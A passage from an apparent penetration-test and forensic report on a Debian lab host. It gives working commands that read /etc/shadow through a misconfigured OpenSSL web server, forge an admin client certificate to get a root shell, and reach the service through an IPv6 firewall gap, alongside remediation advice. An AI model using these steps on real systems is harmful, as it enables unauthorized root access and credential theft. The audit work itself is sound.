Since neither wget nor cURL is installed on the target machine and port `443` is only reachable from the machine itself we forwarded the port using SSH.

```default
┌──(kali㉿kali)-[~]
└─$ ssh -L 8443:127.0.0.1:443 bluey@10.1.0.5
```

Ignoring certificate validation for the self-signed certificate we are able to access the webserver with cURL.

```default
┌──(kali㉿kali)-[~]
└─$ curl -k https://127.0.0.1:8443
Error opening ''
139940656027328:error:02001002:system library:fopen:No such file or directory:bss_file.c:169:fopen('','r')
139940656027328:error:2006D080:BIO routines:BIO_new_file:no such file:bss_file.c:172:
```

Looking at the service configuration file we can see that the `s_server` is launched using the `WWW` flag in the `/etc/` directory with root privileges which means that all files in the directory should be accessible through the web server.

```default
secureding [/etc/drsfowp]: cat /lib/systemd/system/drsfowp.service 
[Unit]
Description=Dilithium regeneration server for overcritical Warp plasma
After=network-online.target
StartLimitIntervalSec=0

[Service]
Type=simple
WorkingDirectory=/etc
ExecStart=/usr/local/bin/openssl s_server -accept 443 -WWW -cert /etc/drsfowp/drsfowp.crt -key /etc/drsfowp/drsfowp.key
Restart=always

[Install]
WantedBy=multi-user.target
```

To prove this statement we try to access the `/etc/shadow` file which is only readable by the root user and the shadow group.

```default
secureding [~]: ls /etc/shadow
-rw-r----- 1 root shadow 769   18.02.2022 17:32:22 /etc/shadow
```

```default
┌──(kali㉿kali)-[~]
└─$ curl -k https://127.0.0.1:8443/shadow
root:*:19040:0:99999:7:::
daemon:*:19040:0:99999:7:::
bin:*:19040:0:99999:7:::
sys:*:19040:0:99999:7:::
sync:*:19040:0:99999:7:::
games:*:19040:0:99999:7:::
man:*:19040:0:99999:7:::
lp:*:19040:0:99999:7:::
mail:*:19040:0:99999:7:::
news:*:19040:0:99999:7:::
uucp:*:19040:0:99999:7:::
proxy:*:19040:0:99999:7:::
www-data:*:19040:0:99999:7:::
backup:*:19040:0:99999:7:::
list:*:19040:0:99999:7:::
irc:*:19040:0:99999:7:::
gnats:*:19040:0:99999:7:::
nobody:*:19040:0:99999:7:::
_apt:*:19040:0:99999:7:::
systemd-timesync:*:19040:0:99999:7:::
systemd-network:*:19040:0:99999:7:::
systemd-resolve:*:19040:0:99999:7:::
messagebus:*:19040:0:99999:7:::
sshd:*:19040:0:99999:7:::
bluey:hkX1bj1X6c3cA:19041:0:99999:7:::
bingo:!:19041:0:99999:7:::
systemd-coredump:!*:19041::::::
```

This means that all the content in the `/etc/` directory is exposed to everyone with access to the web server.

#### mgmtserver Service

The next step was inspecting the `Secure management server`.

```default
secureding [~]: sudo systemctl status mgmtserver.service
sudo: unable to resolve host secureding: Name or service not known
● mgmtserver.service - Secure management server
     Loaded: loaded (/lib/systemd/system/mgmtserver.service; enabled; vendor preset: enabled)
     Active: active (running) since Thu 2022-03-17 17:18:12 UTC; 1 day 20h ago
   Main PID: 200348 (mgmtserver)
      Tasks: 2 (limit: 2340)
     Memory: 4.8M
        CPU: 23ms
     CGroup: /system.slice/mgmtserver.service
             ├─200348 /usr/bin/python3 /opt/mgmtserver/mgmtserver { "certfile": "/etc/management-server/server.crt", "keyfile": "/etc/management-server/server.key" }
             └─200349 /usr/bin/openssl s_server -accept 20321 -cert /etc/management-server/server.crt -key /etc/management-server/server.key -naccept 1 -Verify 1
```

This server is executing a Python program located in `/opt/mgmtserver/mgmtserver`. The program is reading a JSON formatted input from its command line arguments. The arguments include `certfile` and `keyfile` which are certificates located in `/etc/management-server/`. 

```default
secureding [~]: ls /etc/management-server/
total 8,0K
-rw-r--r-- 1 root root 1,3K   08.10.2019 23:13:26 server.crt
-rw-r--r-- 1 root root 1,7K   16.10.2018 05:44:32 server.key
```

Listing the `/etc/management-server/` directory shown permission issues on the certificate files. They are world readable with their permissions set to `644` and the ones of their parent folder to `755`.

The next logical thing to do was to validate the private key and ensure its modulus matches the one of the client certificate.

```default
secureding [/etc/management-server]: openssl rsa -check -noout -in server.key
RSA key ok
secureding [/etc/management-server]: openssl rsa -modulus -noout -in server.key | openssl sha256
(stdin)= 59119db4bf68def0243d4ea61530f6e79c4026461920643b12814edae4ae9cd5
secureding [/etc/management-server]: openssl x509 -modulus -noout -in server.crt | openssl sha256
(stdin)= 59119db4bf68def0243d4ea61530f6e79c4026461920643b12814edae4ae9cd5
```

We inspected the certificate using the OpenSSL command line suite.

```default
secureding [/etc/management-server]: openssl x509 -in server.crt -text
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 16150562545210259616 (0xe0225310c5fc78a0)
    Signature Algorithm: sha1WithRSAEncryption
        Issuer: CN=Amazing Management Server with super strong authentication
        Validity
            Not Before: Feb 18 15:48:57 2022 GMT
            Not After : Mar 20 15:48:57 2022 GMT
        Subject: CN=Amazing Management Server with super strong authentication
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
[...]
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier: 
                DA:05:0B:0B:93:A3:89:D6:04:24:91:08:FB:99:01:D8:EE:BD:03:D9
            X509v3 Authority Key Identifier: 
                keyid:DA:05:0B:0B:93:A3:89:D6:04:24:91:08:FB:99:01:D8:EE:BD:03:D9

            X509v3 Basic Constraints: 
                CA:TRUE
[...]
-----END CERTIFICATE-----
```

Looking at the signature algorithm one can immediately see that the certificate is using `sha1WithRSAEncryption` which is inherently insecure. Furthermore, the public key has a length of 2048 bit which currently is the recommended minimum length.

Also, the certificate is a CA root certificate, which is shown by the `CA:TRUE`
part in the basic constraints block.

##### Server Authentication

Using the OpenSSL `s_client` without any client certificate we are not able to successfully establish a session with the management server.

```default
bluey@secureding:~$ openssl s_client -connect 127.0.0.42:20321 2>/dev/null | grep -P "Session-ID|granted"
    Session-ID: 
    Session-ID-ctx:
```

As shown by the file inspection of the user `bluey` there is a client certificate in the home directory. Using the OpenSSL `s_client` we are able to authenticate against the management server using the certificate and key file.

```default
bluey@secureding:~$ openssl s_client -connect 127.0.0.42:20321 -cert ~/.management/client.crt -key ~/.management/client.key 2>/dev/null | grep -P "Session-ID|granted"
    Session-ID: FEA1B6BAF5D70112554429B1DBFA7E2EBEB154304B281267167560A0C7D24CFB
    Session-ID-ctx: 
System information granted to visitor!
```

The server responds with the notice that we are connected with visitor privileges. As we remember from the previous chapter the client certificates given organizational unit (`OU`) is set to `OU=admin=false`.

Let us check what will happen if we set `OU=armin=true`.

```default
bluey@secureding:~$ openssl req -new -nodes -newkey rsa:2048 -subj "/CN=Management Client Certificate/O=Secure Systems Inc./OU=armin=true" -x509 -keyout armin.key -out armin.crt
Generating a 2048 bit RSA private key
.............................................................................................+++
..............+++
writing new private key to 'armin.key'
-----
```

Unfortunately this does not work, and we see that `armin=true` is not even authorized as a visitor. Furthermore, the certificate is invalid.

```default
bluey@secureding:~$ openssl s_client -connect 127.0.0.42:20321 -cert ~/armin.crt -key ~/armin.key 2>/dev/null | grep -P "Session-ID|invalid"
    Session-ID: EBE0BF889D6992476B9B66462E08473D781D7569EF381728FA96F5086370E563
    Session-ID-ctx: 
Error: your client certificate is invalid
```

The next step was to craft a new certificate with a new key and the organizational unit `OU=admin=true`.

```default
bluey@secureding:~$ openssl req -new -nodes -newkey rsa:2048 -subj "/CN=Management Client Certificate/O=Secure Systems Inc./OU=admin=true" -x509 -keyout admin.key -out admin.crt
Generating a 2048 bit RSA private key
....+++
..............+++
writing new private key to 'admin.key'
-----
```

Again we try to connect with this new crafted certificate to the management server.

```default
bluey@secureding:~$ openssl s_client -connect 127.0.0.42:20321 -cert ~/admin.crt -key ~/admin.key 2>/dev/null | grep -P "Session-ID|granted"
    Session-ID: 6F7D5FDA461C1B52EE9510F57A2FB0E2A646D4E9D0DCF71BF036C10CBFFBFF21
    Session-ID-ctx: 
Administrator access granted.

```

It should be noted that in contrast to the previous attempts the process does not terminate immediately and has to be canceled manually.

When we rerun the command without piping it into `grep` we can utilize the process `stdin` as an interactive root shell.

```default
bluey@secureding:~$ openssl s_client -connect 127.0.0.42:20321 -cert ~/admin.crt -key ~/admin.key
[...]
    Session-ID: 6F46A188FD5BEF76E832134F3C034D1CA2114DE1A0BF92C75D2BB6F3C179655F
    Session-ID-ctx: 
[...]
Administrator access granted.
id
uid=0(root) gid=0(root) groups=0(root)
```

Since the service is also reachable from the outside of the target machine it is possible to gain an interactive root shell from everywhere without having access in the first place.

##### Source Code Analysis

All the source code is located in `/opt/mgmtserver/mgmtserver` which is only accessible by the root user. By taking a deeper look at the `mgmtserver` file we can see that a default config is defined which can be overwritten by passing a JSON object as command line parameter. A subprocess executing OpenSSL `s_server` is started and processes lines from standard input if clients connect to the server.

The client certificate subject is hardcoded to

```default
subject=CN = Management Client Certificate, O = Secure Systems Inc., OU = admin=false
```

for a normal user or

```default
subject=CN = Management Client Certificate, O = Secure Systems Inc., OU = admin=true
```

for the admin user respectively.

The server performs its authentication checks in the following way

  - If no certificate is given nothing happens and the connection is terminated.
  - If a client certificate is given the following cases are handled
    - If the certificate subject is equal to the hardcoded value of a normal user the output displays a login message for a visitor and the content of `/proc/meminfo`. Afterwards the connection is terminated.
    - If the certificate subject is equal to the hardcoded value of an administrative user the output displays a login message for an admin and keeps the connection open. All input sent from the client is being executed as a subprocess and the output is printed. This allows for an interactive root shell.
    - If the given certificate matches none of the authorized values a corresponding error message is returned and the connection is terminated.

As an immediate measure against this possible root shell exploit we stopped the `mgmtserver.service`.

#### socat Service

The socat service is a multipurpose relay tool which is often used by system administrators. In this case the socat tool is used to proxy traffic from the TCP4 `443` port to the TCP6 `41947` port which is reachable from the outside as already shown. This means that the `/etc/` directory is not only exposed to the local machine through the webserver but is also reachable from any other machine on the same network.

```default
┌──(kali㉿kali)-[~]
└─$ ip a | grep -o "inet.*wg0" && curl -sk https://[fd01::5]:41947/shadow | grep bluey
inet 10.2.0.14/16 scope global wg0
bluey:hkX1bj1X6c3cA:19041:0:99999:7:::
```

This means that we would not have to brute force the password of the user `bluey` using SSH. It would have been sufficient to copy the required line from the shadow via the socat service and in this way we would be able to crack the password locally.

### File System Analysis

Using the `lsblk` as well as the `fdisk -l` command and looking into the `/etc/fstab` shows that there are no further disks and partitions except the main partition and the smaller BIOS boot partition. In the same manner the commands `lspci` and `lsusb` were checked but returned no interesting results. So we only have to analyze the `/dev/sda2` partition mounted at `/`.

We took a look in every top level folder with the following results. In the `/etc/` folder we found two interesting and non-standard directories, `/etc/drsfowp/` and `/etc/management-server/`. Further we analyzed the `/etc/shadow` file which had the right permissions set but used a weak hashing algorithm (DES) for the password of user `bluey`. The system configuration is correctly set to use `yescrypt` though. The `/etc/passwd` file contains only on user (`root`) with id `0`.

```default
secureding [~]: grep :0: /etc/passwd
root:x:0:0:root:/root:/bin/bash
```

When inspecting the `/etc/ssl/` folder we realized that a `openssl.cnf` is contained in there. We take a deeper look at it later on. The `/etc/ssl/private/ssl-cert-snakeoil.key` has properly configured permissions (`640`). However, inspecting the certificate using the OpenSSL command line suite we notice that this certificate was not signed by `debian` but `reliant.homelan.net`.

```default
secureding [~]: openssl x509 -in /etc/ssl/certs/ssl-cert-snakeoil.pem -text
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            3c:66:f5:1f:22:ad:cc:b6:42:3e:cf:78:63:9f:40:d1:9b:b4:41:ad
    Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN=reliant.homelan.net
        Validity
            Not Before: Feb 18 10:45:05 2022 GMT
            Not After : Feb 16 10:45:05 2032 GMT
        Subject: CN=reliant.homelan.net
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
[...]
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Subject Alternative Name: 
                DNS:reliant.homelan.net
[...]
```

All the other certificates matched the ones in a default installation of Debian 11.

The next logical thing to do was to validate the private key and ensure its modulus matches the one of the client certificate.

```default
secureding [~]: openssl rsa -check -noout -in /etc/ssl/private/ssl-cert-snakeoil.key
RSA key ok
secureding [~]: openssl rsa -modulus -noout -in /etc/ssl/private/ssl-cert-snakeoil.key | openssl sha256
(stdin)= d43407933eef2d4ecc3fbc0a98e6c6390d353bc064aa8671ba30f14fa40bec51
secureding [~]: openssl x509 -modulus -noout -in /etc/ssl/certs/ssl-cert-snakeoil.pem | openssl sha256
(stdin)= d43407933eef2d4ecc3fbc0a98e6c6390d353bc064aa8671ba30f14fa40bec51
```

So we can see that the new certificate was created by using the given key. Further we checked the `/etc/sudoers` file for more differences but the only non-standard thing was the appended rights for user `bluey` which are described in the chapter above. We also ensured that the permissions for the files `shadow`, `shadow-`, `gshadow` and `gshadow-` are correctly set to `640` and have the right owner and group (`root` and `shadow`). The `/etc/hosts` file is lacking the entry for `secureding` which results in an error message using `sudo`.

```default
secureding [~]: sudo echo "It's always DNS!"
sudo: unable to resolve host secureding: Name or service not known
It's always DNS!
```

In the `/home/` folder are only the folders of the two user accounts which we have analyzed before. Same with the already checked folder `/root/`. The folders `/lost+found/`, `/media/`, `/mnt/` and `/srv/` were empty. The folder `/opt/` only contains the already analyzed `/opt/mgmtserver/` directory. The `/tmp/` directory does not contain interesting files. The only interesting files in `/var/` was the folder `/var/www/html/`, `/var/mail/` did not contain any files. `/var/spool/cron/crontabs/` was also empty. It should be noted that we checked the `/etc/crontab` file as well as all the `/etc/cron.*/` directories, but they all contained standard configs.

The `/usr/` directory contains a bunch of interesting files and folders.

```default
secureding [/usr]: find /usr/ -maxdepth 1 -not -name jbin -exec ls -al {} \; | grep "\-\-\-"
drwx------  7 root root  4096 Feb 17 20:22 jbin
drwx------  2 root root  4096 Feb 18 14:57 certs
drwx------  2 root root  4096 Feb 18 14:57 misc
drwx------  2 root root  4096 Feb 18 14:57 private
-rwx------  1 root root       17464 Sep 10  2020 firmware_update
-rwx------  1 root root       17416 Dez 23  2020 heartbeat
```

Starting with the files there are the two binaries `firmware_update` and `heartbeat`. We will take a deeper look at them later on.

The `jbin` collection from GitHub with commit hash `d3a133a` present in `/usr/jbin`.

```default
secureding [/usr/jbin]: git log -1
commit d3a133a54a52204378145dcbc89b994d7dd95e12 (HEAD -> master, origin/master, origin/HEAD)
Author: Johannes Bauer <joe@johannes-bauer.com>
Date:   Mon Feb 14 15:31:50 2022 +0100

    Add some more verbosity to build_sdist
    
    When debugging, output of the commands that are run might be useful.
```

The remaining non-standard folders `/usr/local/certs/` and `/usr/local/private/` are present with the permissions set to `700` are empty. The folder `/usr/local/misc/` contains various Perl and Shell scripts related to OpenSSL.

```default
secureding [~]: ls /usr/local/misc/
total 40K
-rwxr-xr-x 1 root root 5,6K   18.02.2022 14:57:02 CA.pl
-rwxr-xr-x 1 root root 5,1K   18.02.2022 14:57:02 CA.sh
-rwxr-xr-x 1 root root  119   18.02.2022 14:57:02 c_hash
-rwxr-xr-x 1 root root  152   18.02.2022 14:57:02 c_info
-rwxr-xr-x 1 root root  112   18.02.2022 14:57:02 c_issuer
-rwxr-xr-x 1 root root  110   18.02.2022 14:57:02 c_name
-rwxr-xr-x 1 root root 6,3K   18.02.2022 14:57:02 tsget
```

In the `/usr/local/lib/` folder we found the `libcrypto.a` and the `libssl.a` libraries. The folder `/usr/local/lib/engines/` is empty. The OpenSSL configuration file is located in `/usr/local/openssl.cnf`. Included in the directory `/usr/local/lib/pkgconfig/` we found the package configuration files for the `libcrypto` and `libssl` libraries as well as the `openssl` binary we located in `/usr/local/bin/`.

```default
secureding [~]: ls /usr/local/bin/openssl
-rwxr-xr-x 1 root root 2,9M   18.02.2022 14:57:02 /usr/local/bin/openssl
```

As indicated by the timestamps all the OpenSSL related files and folders above were likely created by compiling OpenSSL manually. We will take a deeper look at this later on.

#### Executables

In this chapter we will analyze the suspicious binaries from `/usr/bin/`.

First we checked the dynamic link libraries used by the given programs. The binaries have 36 linked libraries in total one of them being `libcurl`. Most of the other libraries are related to the `libcurl` for example `libssl` and `libcrypto`.

```default
secureding [~]: ldd /usr/bin/heartbeat | awk '{print $1}'> ldd_heartbeat
secureding [~]: ldd /usr/bin/firmware_update | awk '{print $1}'> ldd_firmware_update
secureding [~]: diff ldd_heartbeat ldd_firmware_update
secureding [~]:
```

To ensure we are not missing any important libraries we build a simple program utilizing the `libcurl` library ourselves. Before starting to code, we installed the required development library via `sudo apt install libcurl4-openssl-dev`. The programs itself looks the following

```c
// gcc -o test test.c -lcurl
#include <curl/curl.h>

int main() {
  CURL *curl_handle;
  curl_handle = curl_easy_init();
}
```

After building and using `ldd` again we can now prove that every linked library in the given binaries comes from `libcurl`.

So we can see that they are using the same linked libraries because the diff of both of them is empty. Because one of the libraries is `libcurl` we suspect that the binaries do some web requests, so we copy them with `scp` to our pentesting machine to analyze them with Wireshark and other helpful tools. The machine itself was only connected to the internet for the `scp` file transfer. To verify the integrity of the files we build the `sha256sum` of both files on each of the systems and checked them against each other. This shows us that the files' integrity is fine.

Before taking a deeper look on the single files we compared the `strings` output of the two binaries.

```default
┌──(kali㉿kali)-[~]
└─$ diff strings_heartbeat strings_firmware_update 
22,26c22,27
< D$`1
< )L$ f
< )L$0f
< )L$@
< )D$P
---
> )t$ f
> )l$0f
> )d$@
> )\$P
> )T$`
> )L$p
29,30c30,31
< Heartbeat successful.
< Heartbeat failed; server returned HTTP %ld.
---
> Firmware update successful.
> Firmware update failed; server returned HTTP %ld.
34c35
< heartbeat.c
---
> firmware_update.c
```

We can now easily see that the two binaries are mostly identical with some differences in output messages. The cryptic part is probably related to the target URL as no plaintext URL can be found in the `strings`. It seems like the URL was obfuscated intentionally.

```default
┌──(kali㉿kali)-[~]
└─$ strings heartbeat| grep -i uri
obfuscated_uri
```

Therefore, we decided to sniff the network traffic while we first execute the two binaries on our isolated system. To easily handle this we use Wireshark to capture the network traffic.

##### firmware_update File

Starting with the `/usr/bin/firmware_update` we started a Wireshark scan in the background and executed the `firmware_update` binary which failed to resolve a hostname like shown in the error below.

```default
┌──(kali㉿kali)-[~]
└─$ ./firmware_update
Firmware update failed; server returned HTTP 0.
curl_easy_perform() failed: Couldn't resolve host name
```

From the Wireshark scan we extracted the hostname our binary is trying to resolve.

|No.|Source   |Destination|Protocol|Length|Info                                      |
|---|---------|-----------|--------|------|------------------------------------------|
|1  |127.0.0.1|127.0.0.1  |DNS     |73    |Standard query 0xc8da A www.nsa.gov       |
|2  |127.0.0.1|127.0.0.1  |ICMP    |101   |Destination unreachable (Port unreachable)|
|3  |127.0.0.1|127.0.0.1  |DNS     |73    |Standard query 0x8adc AAAA www.nsa.gov    |
|4  |127.0.0.1|127.0.0.1  |ICMP    |101   |Destination unreachable (Port unreachable)|
|5  |127.0.0.1|127.0.0.1  |DNS     |73    |Standard query 0xc8da A www.nsa.gov       |
|6  |127.0.0.1|127.0.0.1  |ICMP    |101   |Destination unreachable (Port unreachable)|
|7  |127.0.0.1|127.0.0.1  |DNS     |73    |Standard query 0x8adc AAAA www.nsa.gov    |
|8  |127.0.0.1|127.0.0.1  |ICMP    |101   |Destination unreachable (Port unreachable)|

So we now can easily see that the requests from the `firmware_update` file try to reach `www.nsa.gov`. The next logical step was to add a new record to the `/etc/hosts` file to redirect all the traffic sent by the file.

```default
┌──(kali㉿kali)-[~]
└─$ echo "127.0.0.1       www.nsa.gov" | sudo tee -a /etc/hosts
```

We now need an HTTP(S) proxy to get the request to work. Using the Burp Suite is the easiest way to handle traffic interception. After starting the Burp Suite we entered the following commands in the terminal we later execute the binary file in.

```default
┌──(kali㉿kali)-[~]
└─$ export http_proxy="http://localhost:8080" 

┌──(kali㉿kali)-[~]
└─$ export https_proxy="http://localhost:8080" 

┌──(kali㉿kali)-[~]
└─$ ./firmware_update
```

We note that the process does not terminate immediately, and we have successfully intercepted the HTTPS connection. Burp Suite shows us the following output.

```default
GET /.management/firmware_update?id=c2f8016b-b339-4557-b3ae-20de01189dae&current_version=0.3.8d&urgent=1 HTTP/1.1
Host: www.nsa.gov
Accept: */*
Connection: close
```

It should be noted that the HTTPS connection is not validating the self-signed TLS certificate. After dropping the received package an HTTP `200` status code is returned and the `firmware_update` file terminated with the following output.

```default
┌──(kali㉿kali)-[~]
└─$ ./firmware_update                         
Firmware update successful.
```

##### heartbeat File

Starting again with a clean setup we repeated the process for the `/usr/bin/heartbeat` file. We started a Wireshark scan in the background and executed the `heartbeat` binary which again failed to resolve a hostname like shown in the error below.

```default
┌──(kali㉿kali)-[~]
└─$ ./heartbeat      
Heartbeat failed; server returned HTTP 0.
curl_easy_perform() failed: Couldn't resolve host name
```

From the Wireshark scan we extracted the same hostname as before our binary is trying to resolve.

|No.|Source   |Destination|Protocol|Length|Info                                      |
|---|---------|-----------|--------|------|------------------------------------------|
|1  |127.0.0.1|127.0.0.1  |DNS     |73    |Standard query 0x9559 A www.nsa.gov       |
|2  |127.0.0.1|127.0.0.1  |ICMP    |101   |Destination unreachable (Port unreachable)|
|3  |127.0.0.1|127.0.0.1  |DNS     |73    |Standard query 0x195a AAAA www.nsa.gov    |
|4  |127.0.0.1|127.0.0.1  |ICMP    |101   |Destination unreachable (Port unreachable)|
|5  |127.0.0.1|127.0.0.1  |DNS     |73    |Standard query 0x9559 A www.nsa.gov       |
|6  |127.0.0.1|127.0.0.1  |ICMP    |101   |Destination unreachable (Port unreachable)|
|7  |127.0.0.1|127.0.0.1  |DNS     |73    |Standard query 0x195a AAAA www.nsa.gov    |
|8  |127.0.0.1|127.0.0.1  |ICMP    |101   |Destination unreachable (Port unreachable)|

So we now can easily see that the requests from the `heartbeat` file try to reach `www.nsa.gov`. The next logical step was to add a new record to the `/etc/hosts` file to redirect all the traffic sent by the file.

```default
┌──(kali㉿kali)-[~]
└─$ echo "127.0.0.1       www.nsa.gov" | sudo tee -a /etc/hosts
```

We now need an HTTP(S) proxy to get the request to work. Using the Burp Suite is the easiest way to handle traffic interception. After starting the Burp Suite we entered the following commands in the terminal we later execute the binary file in.

```default
┌──(kali㉿kali)-[~]
└─$ export http_proxy="http://localhost:8080" 

┌──(kali㉿kali)-[~]
└─$ export https_proxy="http://localhost:8080" 

┌──(kali㉿kali)-[~]
└─$ ./heartbeat      
Heartbeat failed; server returned HTTP 0.
curl_easy_perform() failed: SSL peer certificate or SSH remote key was not OK
```

In contrast to the previous execution we get a TLS certificate validation error. To circumvent this problem we added the Burp Suite CA certificate to the trusted certificates in the isolated testing machine using the `sudo update-ca-certificates` command. Next we can execute the binary again and get the following interception message in Burp Suite.

```default
GET /.management/heartbeat?id=06f92e33-ab63-4da4-8362-dc7be43b096d HTTP/1.1
Host: www.nsa.gov
Accept: */*
Connection: close
```

After dropping the received package an HTTP `200` status code is returned and the `heartbeat` file terminated with the following output.

```default
┌──(kali㉿kali)-[~]
└─$ ./heartbeat                               
Heartbeat successful.
```

## OpenSSL

As we have discovered in our file system analysis there is a custom version of OpenSSL installed in `/usr/local/bin/openssl`. There also is another, more recent version of OpenSSL in `/usr/bin/openssl` but due to the nature of the UNIX `PATH` it is overwritten by the custom installation. This is shown in the command block below.

```default
secureding [~]: echo $PATH          
/usr/jbin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/jbin/sbin
secureding [~]: which openssl
/usr/local/bin/openssl
```

Further information like the versions and configuration directories of the two OpenSSL binaries are listed below. The first block indicates the older binary from `26 Apr 2012`.

```default
secureding [~]: /usr/local/bin/openssl version -b -v -p -d -o
OpenSSL 1.0.1b 26 Apr 2012
built on: Fri Feb 18 14:55:51 UTC 2022
platform: linux-x86_64
options:  bn(64,64) rc4(8x,int) des(idx,cisc,16,int) idea(int) blowfish(idx) 
OPENSSLDIR: "/usr/local"
```

```default
secureding [~]: /usr/bin/openssl version -b -r -v -p -e -d -o
OpenSSL 1.1.1k  25 Mar 2021
built on: Tue Aug 24 08:28:12 2021 UTC
platform: debian-amd64
options:  bn(64,64) rc4(8x,int) des(int) blowfish(ptr) 
OPENSSLDIR: "/usr/lib/ssl"
ENGINESDIR: "/usr/lib/x86_64-linux-gnu/engines-1.1"
Seeding source: os-specific
```

The custom OpenSSL version is configured in `/usr/local/openssl.cnf` whereas the newer OpenSSL version is using the configuration from `/usr/lib/ssl/openssl.cnf` which is symlinked to `/etc/ssl/openssl.cnf`.

For the first fast check we used `sha256sum` to check for non-standard modifications in the two configuration files. Both of them match their default configuration of their respective version.

In case of the older OpenSSL version many configuration options are outdated and give a certain risk for vulnerabilities. The following code block shows the most interesting parts of the `diff` between the old and new configuration file.

```default
secureding [~]: diff /usr/local/openssl.cnf /etc/ssl/openssl.cnf
9d12
< RANDFILE      = $ENV::HOME/.rnd
56d61
< RANDFILE  = $dir/private/.rand    # private random number file
106c111
< default_bits      = 1024
---
> default_bits      = 2048
236,240c241
< # This is what PKIX recommends but some broken software chokes on critical
< # extensions.
< #basicConstraints = critical,CA:true
< # So we do this instead.
< basicConstraints = CA:true
---
> basicConstraints = critical,CA:true
342c343
< digests       = md5, sha1     # Acceptable message digests (mandatory)
---
> digests     = sha1, sha256, sha384, sha512  # Acceptable message digests (mandatory)
350a352,362
[...]
> [system_default_sect]
> MinProtocol = TLSv1.2
> CipherString = DEFAULT@SECLEVEL=2
```

The old OpenSSL version uses a random file in the respective users home directory named `.rnd` which is what we found when inspecting the root users home directory. It contains a seed value for the OpenSSL random number generator. This file is not actively used in the later OpenSSL versions.

In further comparison we see that the newer OpenSSL version has a stronger bit length indicated by the `default_bits`, better basic constraints and by far better message digests as both of the digests in the old OpenSSL versions are broken.

Also, the newer version requires a minimum protocol of `TLSv1.2` and has its default `SECLEVEL` set.

### SSL/TLS Scans

To summarize the TLS connection vulnerabilities we scanned every available port with `sslscan`.

The ports `443`, `20321` and `41947` are being served by the old OpenSSL in `/usr/local/bin/openssl`. We ran a scan against those ports and returned the following results.

So we can see in the code block below that just TLSv1.2 is enabled as state-of-the-art protocol. TLSv1.3 should be enabled too but is disabled and every protocol older than TLSv1.2 should be disabled completely. Further the OpenSSL `s_server` does not support TLS Fallback SCSV which means that the server is vulnerable to malicious downgrade attacks.

```default
  SSL/TLS Protocols:
SSLv2     enabled
SSLv3     enabled
TLSv1.0   enabled
TLSv1.1   enabled
TLSv1.2   enabled
TLSv1.3   disabled
```

Secure session renegotiation is supported on the server. While this is not a bad thing in the first place it is recommended to disable it as TLSv1.3 disables it by default.

All the supported TLS versions are outdated and thereby vulnerable to heartbleed.

```default
  Heartbleed:
TLSv1.2 vulnerable to heartbleed
TLSv1.1 vulnerable to heartbleed
TLSv1.0 vulnerable to heartbleed
```

Next we took a deeper look at the `86` available ciphers shown in **Appendix I** supported by the server.

  - `25` ciphers for TLSv1.0 which should be removed entirely
  - `25` ciphers for TLSv1.1 which should be removed entirely
  - `36` ciphers for TLSv1.2 

Out of the given TLSv1.2 ciphers only the following are appropriate to be used.

```default
Preferred TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-GCM-SHA256   Curve P-256 DHE 256
```

It should be noted that it is absolutely recommended enabling TLSv1.3 with the latest version of OpenSSL using the following ciphers.

```default
Preferred TLSv1.3  128 bits  TLS_AES_128_GCM_SHA256        Curve 25519 DHE 253
Accepted  TLSv1.3  256 bits  TLS_AES_256_GCM_SHA384        Curve 25519 DHE 253
Accepted  TLSv1.3  256 bits  TLS_CHACHA20_POLY1305_SHA256  Curve 25519 DHE 253
Preferred TLSv1.2  256 bits  ECDHE-ECDSA-AES256-GCM-SHA384 Curve 25519 DHE 253
Accepted  TLSv1.2  256 bits  ECDHE-ECDSA-CHACHA20-POLY1305 Curve 25519 DHE 253
Accepted  TLSv1.2  128 bits  ECDHE-ECDSA-AES128-GCM-SHA256 Curve 25519 DHE 253
```

The server key exchange groups are set to use TLSv1.2 128 bit.

```default
  Server Key Exchange Group(s):
TLSv1.2  128 bits  secp256r1 (NIST P-256)
```

While this is a reasonable configuration it is recommended to use TLSv1.2 192 bits as well as the TLSv1.3 options.

```default
  Server Key Exchange Group(s):
TLSv1.3  128 bits  secp256r1 (NIST P-256)
TLSv1.3  192 bits  secp384r1 (NIST P-384)
TLSv1.3  260 bits  secp521r1 (NIST P-521)
TLSv1.3  128 bits  x25519
TLSv1.3  224 bits  x448
TLSv1.2  192 bits  secp384r1 (NIST P-384)
```

## Network Analysis

When it comes to firewall configuration on Debian the easiest choice is to use the Uncomplicated Firewall (`ufw`). However, `ufw` is not installed on the system. Instead, `nftables` is used which is more complicated to configure properly.

Two `iptable` rules are configured.

```default
secureding [~]: iptables -vnL
Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
   38  2280 REJECT     tcp  --  ens18  *       0.0.0.0/0            0.0.0.0/0            tcp dpt:443 reject-with icmp-port-unreachable
    7   420 REJECT     tcp  --  ens18  *       0.0.0.0/0            0.0.0.0/0            tcp dpt:41947 reject-with icmp-port-unreachable

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
```

The first rule disables access to the TCP4 `443` port from the outside which the `drsfowp.service` is running on. The second one disables access to the TCP4 `41947` port which `socat.service` is proxying the `drsfowp.service` to. However, since socat is binding to the TCP6 port `41947` and the rule is only configured for TCP4 the service is still reachable from the outside. This clearly is a firewall misconfiguration since `iptables` has no IPv6 rules at all.

```default
secureding [~]: ip6tables -vnL
Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
```

